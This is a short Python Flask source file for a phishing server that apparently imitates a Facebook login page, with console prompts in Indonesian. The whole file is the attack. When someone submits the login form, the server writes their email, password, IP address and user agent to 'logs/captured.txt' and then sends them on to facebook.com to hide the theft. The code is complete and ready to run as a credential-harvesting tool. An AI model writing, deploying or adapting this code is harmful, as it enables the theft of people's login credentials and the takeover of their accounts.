from flask import Flask, request, render_template, redirect
import os
from datetime import datetime

app = Flask(__name__)

LOG_PATH = "logs/captured.txt"
if not os.path.exists("logs"):
    os.makedirs("logs")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("pass")
        user_agent = request.headers.get("User-Agent")
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        timestamp = datetime.now().strftime("[%d-%m-%Y %H:%M:%S]")

        with open(LOG_PATH, "a") as f:
            f.write(f"{timestamp}\n")
            f.write(f"IP: {ip}\n")
            f.write(f"User-Agent: {user_agent}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Password: {password}\n")
            f.write("-" * 50 + "\n")

        return redirect("https://facebook.com")

    return render_template("login.html")

if __name__ == "__main__":
    port_choice = input("Pilih port (443 / 8080): ").strip()
    port = 443 if port_choice == "443" else 8080
    print(f"[+] Server jalan di http://localhost:{port}")
    app.run(host="0.0.0.0", port=port)
